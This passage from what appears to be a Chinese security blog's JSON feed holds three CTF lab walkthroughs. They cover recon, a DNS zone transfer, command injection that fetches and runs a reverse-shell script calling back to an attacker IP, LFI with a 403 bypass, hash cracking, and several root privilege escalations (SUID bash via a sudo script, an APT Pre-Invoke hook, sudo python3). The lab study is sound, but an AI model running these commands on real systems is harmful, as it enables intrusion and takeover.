            "content_html": "\n# 群U靶机 - Cliv2\n\n## Recon\n\n端口扫描\n\n```scheme\n➜  Test nmap -sT -min-rate 10000 -p- 192.168.56.100\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:37 CST\nNmap scan report for 192.168.56.100\nHost is up (0.00018s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp open  domain\n80/tcp open  http\nMAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```scheme\n\n➜  Test nmap -sT -A -p 22,80,53 192.168.56.100     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:38 CST\nNmap scan report for cliv2.dsz (192.168.56.100)\nHost is up (0.00042s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)\n| dns-nsid: \n|_  bind.version: 9.16.50-Debian\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: CLIv2 Main\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms cliv2.dsz (192.168.56.100)\n```\n\n子域名爆破\n\n```scheme\n➜  Test ffuf -u 'http://cliv2.dsz/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'host: FUZZ.cliv2.dsz' --fs=3669\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://cliv2.dsz/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.cliv2.dsz\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 3669\n________________________________________________\n\nclient                  [Status: 200, Size: 873, Words: 147, Lines: 42, Duration: 0ms]\ndev                     [Status: 200, Size: 654, Words: 113, Lines: 34, Duration: 315ms]\n```\n\n## DNS 区域传输漏洞\n\n看到 `dev` 就很兴奋\n\n点进去后看到 **`AXFR`**\n\n![image.png](/post-images/群U靶机%20-%20Cliv2/image.png)\n\n我一搜，能找到：\n\n> **DNS 区域传输 (`AXFR`)**\n> \n> \n> 使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编辑信息的需要，您可以在一台服务器上编辑信息并使用 AXFR 将信息复制到其他服务器。但是，如果您不保护您的服务器，恶意方可能会使用 AXFR 来获取有关您所有主机的信息。\n> \n\n那么它肯定没有保护\n\n```scheme\n➜  Test dig axfr @192.168.56.100  cliv2.dsz \n\n; <<>> DiG 9.20.9-1-Debian <<>> axfr @192.168.56.100 cliv2.dsz\n; (1 server found)\n;; global options: +cmd\ncliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400\ncliv2.dsz.              86400   IN      A       127.0.0.1\ncliv2.dsz.              86400   IN      NS      ns1.dsz.\n3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1\nclient.cliv2.dsz.       86400   IN      A       127.0.0.1\ndev.cliv2.dsz.          86400   IN      A       127.0.0.1\nns1.cliv2.dsz.          86400   IN      A       127.0.0.1\ncliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400\n;; Query time: 0 msec\n;; SERVER: 192.168.56.100#53(192.168.56.100) (TCP)\n;; WHEN: Thu Jul 31 18:58:51 CST 2025\n;; XFR size: 8 records (messages 1, bytes 264)\n```\n\n## 反弹 shell\n\n有命令执行功能\n\n![image.png](/post-images/群U靶机%20-%20Cliv2/image1.png)\n\n不能有空格限制：不允许使用空格或连字符。最大长度：64 个字符。\n\n在 `Kali` 准备恶意文件，并开启 `HTTP` 服务器\n\n```scheme\n➜  Test cat v.sh \n#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc 192.168.56.5 1234 >/tmp/f\n```\n\n通过两步来拿到 `shell`\n\n```scheme\ncmd=cd${IFS}/tmp;busybox${IFS}wget${IFS}192.168.56.5/v.sh;ls${IFS}/tmp\ncmd=cd${IFS}/tmp;chmod${IFS}777${IFS}v.sh;./v.sh\n```\n\n![image.png](/post-images/群U靶机%20-%20Cliv2/image2.png)\n\n## 权限提升\n\n`Linpeas.sh` 发现 `bitc0de` 家目录中有一个 `…`\n\n```scheme\n╔══════════╣ Searching root files in home dirs (limit 30)\n/home/\n/home/bitc0de/.bash_history\n/home/bitc0de/...\n/home/bitc0de/user.txt\n/root/\n/var/www\n/var/www/html\n/var/www/html/index.html\n/var/www/cliv2.dsz\n/var/www/cliv2.dsz/index.php\n/var/www/3170a7.cliv2.dsz\n/var/www/3170a7.cliv2.dsz/index.php\n/var/www/client.cliv2.dsz\n/var/www/client.cliv2.dsz/index.php\n/var/www/dev.cliv2.dsz\n/var/www/dev.cliv2.dsz/index.php\n```\n\n读取拿到密码\n\n```scheme\nwww-data@Cliv2:/home/bitc0de$ cat ...\nMabEwReOmcpG!123\n```\n\n切换到 `bitc0de` 并查看 `sudo` 权限\n\n```scheme\n\nbitc0de@Cliv2:~$ sudo -l\nMatching Defaults entries for bitc0de on Cliv2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser bitc0de may run the following commands on Cliv2:\n    (ALL) NOPASSWD: /usr/local/bin/hmvcli\n```\n\n`hmvcli`是通过`python`写的\n\n分析后发现其中有一部分代码有问题，只要参数是`config` 就会运行 `setup.sh`\n\n```scheme\nif args['config']:                              \n    print(\"[*] Ejecutando script de configuración...\")\n    subprocess.run([\"bash\", \"setup.sh\"])  \n    sys.exit(0) \n```\n\n梭哈\n\n```scheme\necho \"chmod +s /bin/bash\" > setup.sh\nchmod +x setup.sh\nsudo hmvcli --config\n```\n\n![image.png](/post-images/群U靶机%20-%20Cliv2/image3.png)\n\n\n## 总结\nQ裙：660930334",
            "url": "https://www.sunsetaction.top/2025/07/31/群U靶机 - Cliv2",
            "title": "群U靶机 - Cliv2",
            "summary": "群U靶机 Cliv2 Recon 端口扫描 子域名爆破 DNS 区域传输漏洞 看到 dev 就很兴奋 点进去后看到 AXFR 我一搜，能找到： DNS 区域传输 (AXFR) 使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编...",
            "date_modified": "2025-07-31T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "群U",
                "Linux",
                "DNS",
                "hvmcli"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan",
            "content_html": "\n# Merchan\n\n> https://labs.thehackerslabs.com/machine/109\n> \n\n![image.png](/post-images/TheHackersLabsMerchan/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Merchan nmap -sT -min-rate 10000 -p- 192.168.56.99\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:48 CST\nNmap scan report for 192.168.56.99\nHost is up (0.00078s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.81 seconds\n```\n\n```bash\n➜  Merchan nmap -sT -A -p 22,80 192.168.56.99                                                \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:49 CST\nNmap scan report for 192.168.56.99\nHost is up (0.00048s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\n| ssh-hostkey: \n|   256 da:68:54:15:39:b8:44:ed:b9:08:4c:59:e5:89:50:08 (ECDSA)\n|_  256 b4:7d:98:a8:01:e8:3b:17:43:24:43:39:3a:b4:b8:50 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://merchan.thl\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.48 ms 192.168.56.99\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.52 seconds\n```\n\n## Web\n\n### 子域名 & 目录 爆破\n\n访问 `HTTP` ，这个页面什么功能点都没有\n\n![image.png](/post-images/TheHackersLabsMerchan/image1.png)\n\n尝试爆破一下子域名，只有 `www`\n\n```bash\n➜  Merchan ffuf -u 'http://merchan.thl/' -H 'host: FUZZ.merchan.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fw=18 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://merchan.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.merchan.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 18\n________________________________________________\n\nwww                     [Status: 200, Size: 7235, Words: 2986, Lines: 131, Duration: 866ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:54] :: Errors: 0 ::\n```\n\n目录爆破，能扫描出来一个 `secret.js`\n\n```bash\n➜  Merchan feroxbuster --url http://merchan.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip\n...\n404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        9l       28w      311c http://merchan.thl/images => http://merchan.thl/images/\n200      GET        7l       36w      330c http://merchan.thl/js/scripts.js\n200      GET    10826l    22299w   236792c http://merchan.thl/css/styles.css\n301      GET        9l       28w      311c http://merchan.thl/assets => http://merchan.thl/assets/\n301      GET        9l       28w      308c http://merchan.thl/css => http://merchan.thl/css/\n301      GET        9l       28w      307c http://merchan.thl/js => http://merchan.thl/js/\n200      GET        8l       29w    28898c http://merchan.thl/assets/favicon.ico\n200      GET      563l     3920w   380306c http://merchan.thl/images/sudadera.png\n200      GET      139l      592w    68236c http://merchan.thl/images/camiseta.jpg\n200      GET      186l      943w    74237c http://merchan.thl/images/llavero.jpg\n200      GET      130l      399w     7235c http://merchan.thl/\n200      GET        1l       15w     1365c http://merchan.thl/secret.js\n```\n\n被混淆过了\n\n![image.png](/post-images/TheHackersLabsMerchan/image2.png)\n\n直接通过 AI 复原即可\n\n```bash\nfunction createLink(){\n    const _0xd35862 = _0x4b23, // _0xd35862 是解码函数的别名\n          _0x398463 = '2e81eb4e952a3268babddecad2a4ec1e.php',\n          _0x199a7f = document[_0xd35862(0x17b)]('a');\n\n    _0x199a7f[_0xd35862(0x17d)] = _0xd35862(0x171);\n    _0x199a7f[_0xd35862(0x177)] = _0x398463;\n    document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);\n}\n_0xd35862(0x17b) -> 解码后是 'createElement'\n_0xd35862(0x17d) -> 解码后是 'innerText'\n_0xd35862(0x171) -> 解码后是 'Haga\\x20click\\x20aqui' (即 \"Haga click aqui\")\n_0xd35862(0x177) -> 解码后是 'href'\n_0xd35862(0x174) -> 解码后是 'body'\n_0xd35862(0x179) -> 解码后是 'appendChild'\n```\n\n也就是会打开 `2e81eb4e952a3268babddecad2a4ec1e.php`\n\n但是我们跳转后发现，还是会提示 `403` （任何 `php` 页面都是）\n\n![image.png](/post-images/TheHackersLabsMerchan/image3.png)\n\n尝试`bypass403` ，直接加上斜杠即可\n\n![image.png](/post-images/TheHackersLabsMerchan/image4.png)\n\n但是访问还是空白的\n\n![image.png](/post-images/TheHackersLabsMerchan/image5.png)\n\n### 模糊测试\n\n我们对其进行模糊测试，首先测试任意文件读取\n\n但是加上参数后，还是提示了 `403`\n\n```bash\nhttp://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd\n```\n\n再次进行绕过\n\n这里工具并无法进行绕过了\n\n![image.png](/post-images/TheHackersLabsMerchan/image6.png)\n\n我们进行手动绕过，最后加上 `Referer` 即可绕过\n\n![image.png](/post-images/TheHackersLabsMerchan/image7.png)\n\n我们再次进行\n\n```bash\n➜  Merchan ffuf -u 'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -H 'Referer: http://merchan.thl/' --fs=0\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Referer: http://merchan.thl/\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 0\n________________________________________________\n\nfile                    [Status: 200, Size: 1187, Words: 27, Lines: 23, Duration: 0ms]\n```\n\n### 任意文件读取 & 密码爆破\n\n枚举出来参数 `file`\n\n![image.png](/post-images/TheHackersLabsMerchan/image8.png)\n\n我们读取 `2e81eb4e952a3268babddecad2a4ec1e.php` 的源码\n\n```bash\n<?php<br />\n$file = $_GET['file'] ?? '';<br />\nif ($file) {<br />\necho nl2br(file_get_contents($file));<br />\n}<br />\n?><br />\n```\n\n到这里测试了可以使用伪协议但是不能执行语句，也不可以包含，`julia` 前 `5000` 也没爆破出来有点没思路\n\n![image.png](/post-images/TheHackersLabsMerchan/image9.png)\n\n看了下 `WP`，发现密码在 `rockyou` `7000`行… (PS：规则明明说爆破需要设置不超`5000`行的)\n\n![image.png](/post-images/TheHackersLabsMerchan/image10.png)\n\n用户家目录下读取 `user.txt`\n\n```bash\njulia@Thehackerslabs-merchan:~$ cat user.txt \nb4axxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 权限提升\n\n`sudo` 权限 \n\n```bash\njulia@Thehackerslabs-merchan:~$ sudo -l\nsudo: unable to resolve host Thehackerslabs-merchan: Fallo temporal en la resolución del nombre\n[sudo] contraseña para julia: \nSorry, user julia may not run sudo on Thehackerslabs-merchan.\n```\n\n上传 `linpeas`\n\n```bash\n╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)\n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files \n/dev/mqueue\n/dev/shm\n/etc/apt/apt.conf.d\n/home/julia\n```\n\n看到一个有趣的可写目录 `/etc/apt/apt.conf.d`\n\n> https://zhuanlan.zhihu.com/p/1888937295215851002\n> \n\n当系统运行 `apt update` 时，会加载 `/etc/apt/apt.conf.d` 文件夹的所有配置文件\n\n```scheme\necho 'APT::Update::Pre-Invoke {\"chmod +s /bin/bash\"}' > a\n```\n\n过了一会之后我们再查看 `/bin/bash` 权限\n\n![image.png](/post-images/TheHackersLabsMerchan/image11.png)\n\n读取 `root.txt`\n\n```scheme\nbash-5.2# cat root.txt \n056e7xxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan",
            "title": "TheHackersLabs - Merchan",
            "summary": "Merchan https://labs.thehackerslabs.com/machine/109 Recon PortScan Web 子域名 & 目录 爆破 访问 HTTP ，这个页面什么功能点都没有 尝试爆破一下子域名，只有 www 目录爆破，能扫描出来一个 secret.js 被混淆过了...",
            "date_modified": "2025-07-31T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "APT",
                "LFI",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW",
            "content_html": "\n# HEXTHINK SILENT SHADOW\n\n> https://labs.thehackerslabs.com/machine/110\n> \n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW nmap -sT -min-rate 10000 -p- 192.168.56.97\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:39 CST\nNmap scan report for 192.168.56.97\nHost is up (0.00038s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n9090/tcp open  zeus-admin\nMAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.42 seconds\n```\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW nmap -sT -A -p 22,80,3306,9090 192.168.56.97                           \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:41 CST\nNmap scan report for 192.168.56.97         \nHost is up (0.00041s latency).\n                                                                                                \nPORT     STATE SERVICE    VERSION                                                                                                                                                               \n22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:        \n|   256 4d:6e:39:a4:15:86:88:70:c7:9d:09:91:a3:0b:18:8c (ECDSA)\n|_  256 f9:21:5d:25:ee:76:05:db:01:3b:45:c9:68:b0:82:9f (ED25519)\n80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)                                                    \n|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).\n3306/tcp open  mysql      MariaDB 5.5.5-10.11.11 \n| mysql-info:      \n|   Protocol: 10         \n|   Version: 5.5.5-10.11.11-MariaDB-0ubuntu0.24.04.2\n|   Thread ID: 35                                                                                                                                                                               \n|   Capabilities flags: 63486                                                                   \n|   Some Capabilities: SupportsCompression, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins\n|   Status: Autocommit                                                                                                                                                                          \n|   Salt: BwQo]cXnB?UoLmc(9'Wb                                                                  \n|_  Auth Plugin Name: mysql_native_password\n9090/tcp open  tcpwrapped     \nMAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                           \nDevice type: general purpose                                                                    \nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19                                                                   \nNetwork Distance: 1 hop                                                                         \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                         \n                                                                                                \nTRACEROUTE                                                                                      \nHOP RTT     ADDRESS\n1   0.41 ms 192.168.56.97\n                                                                                                \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                           \nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds \n```\n\n### 枚举\n\n访问 `HTTP` ，提示了很有意思的东西\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image1.png)\n\n得到数据库的用户 `ctf_user`\n\n连接数据库，意外的发现不用数据库\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image2.png)\n\n数据库里面好几个表（账户，雇员，消息，供应商，用户），还存了一些图片\n\n一些有趣的信息：\n\n```bash\nBuscamos pentesters sin miedo. Contacto interno: d3v@n0m41n.\n//\nadmin\t21232f297a57a5a743894a0e4a801fc3\ntest\t098f6bcd4621d373cade4e832627b4f6\nsupport\te99a18c428cb38d5f260853678922e03\nh4cker\t5f4dcc3b5aa765d61d8327deb882cf99\n```\n\n我们将用户表进行爆破\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image3.png)\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 users\nUsing default input encoding: UTF-8\nLoaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword         (h4cker)     \nabc123           (support)     \nadmin            (admin)     \ntest             (test)     \n4g 0:00:00:00 DONE (2025-07-30 21:54) 200.0g/s 8313Kp/s 8313Kc/s 9350KC/s tyson4..tauruz\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n```\n\n目录爆破\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW feroxbuster --url http://192.168.56.97/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip\n                                                                                        \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.97/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET        3l       38w      383c http://192.168.56.97/\n200      GET      872l     4588w    76866c http://192.168.56.97/index2.php\n200      GET        3l       38w      383c http://192.168.56.97/index.php\n301      GET        9l       28w      319c http://192.168.56.97/javascript => http://192.168.56.97/javascript/\n200      GET      872l     4588w    76849c http://192.168.56.97/info.php\n301      GET        9l       28w      326c http://192.168.56.97/javascript/jquery => http://192.168.56.97/javascript/jquery/\n[####################] - 3m   3114515/3114515 0s      found:7       errors:4      \n[####################] - 3m   1038145/1038145 5925/s  http://192.168.56.97/ \n[####################] - 3m   1038145/1038145 5868/s  http://192.168.56.97/javascript/ \n[####################] - 3m   1038145/1038145 6569/s  http://192.168.56.97/javascript/jquery/ \n```\n\n`index2.php` 和 `info.php` 是一样的\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image4.png)\n\n扫描后发现，用户表中信息无用，我已经将其拿去进行爆破了，但是没有结果\n\n然后 `notice`表中，有一个 ‘你已经走了很长一段路。但还有很长的路要走……’，并附上了一张照片\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image5.png)\n\n我们将照片保存下来，格式是 `JPG`\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image6.png)\n\n我们尝试提取信息\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW binwalk -Me --run-as=root 2.jpg    \n\nScan Time:     2025-07-30 22:34:11\nTarget File:   /root/Desktop/TheHackersLabs/HEXTHINK_SILENT_SHADOW/2.jpg\nMD5 Checksum:  1576b20a92fe6ac42b11889e1f790aa1\nSignatures:    436\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n\n➜  HEXTHINK_SILENT_SHADOW stegseek 2.jpg            \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"hello\"\n[i] Original filename: \"instrucciones.txt\".\n[i] Extracting to \"2.jpg.out\".\n```\n\n最后使用 `StegSeek` 能获取到东西\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW cat 2.jpg.out                 \nPara continuar deberás abrir el Puerto 9090\n\nEsto no es un escaneo Es un saludo\n\nEnvía la siguiente cadena al puerto 9090:\n\nLOGIN whisper\nKEY whisper9090\n\nNo lo hagas mal Solo hay una oportunidad\n```\n\n让我将其发送到 `9090`，并且只有一次机会\n\n```bash\n➜  HEXTHINK_SILENT_SHADOW echo \"LOGIN whisper\\nKEY whisper9090\" | nc 192.168.56.97 9090\nUsuario SSH: whisper\nContraseña: 7h3m1nDf0x\n```\n\n发送后得到一组账户凭据\n\n我们进行 `SSH` 登录，拿 `user.txt`\n\n```bash\nwhisper@server:~$ cat user.txt \nTHL{8axxxxxxxxxxxxxx\n```\n\n## 权限提升\n\n`sudo` 权限\n\n```bash\nwhisper@server:~$ sudo -l\nMatching Defaults entries for whisper on server:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser whisper may run the following commands on server:\n    (ALL) NOPASSWD: /usr/bin/python3\n```\n\n梭哈\n\n```bash\nwhisper@server:~$ sudo /usr/bin/python3 -c \"import os;os.system('/bin/bash -p')\"\nroot@server:/home/whisper# \n```\n\n```bash\nroot@server:~# cat root.txt \nTHL{Zpxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW",
            "title": "TheHackersLabs - HEXTHINK SILENT SHADOW",
            "summary": "HEXTHINK SILENT SHADOW https://labs.thehackerslabs.com/machine/110 Recon PortScan 枚举 访问 HTTP ，提示了很有意思的东西 得到数据库的用户 ctf user 连接数据库，意外的发现不用数据库 数据库里面好几个表（...",
            "date_modified": "2025-07-31T00:00:00.000Z",
            "author": {
                "name": "Sunset",
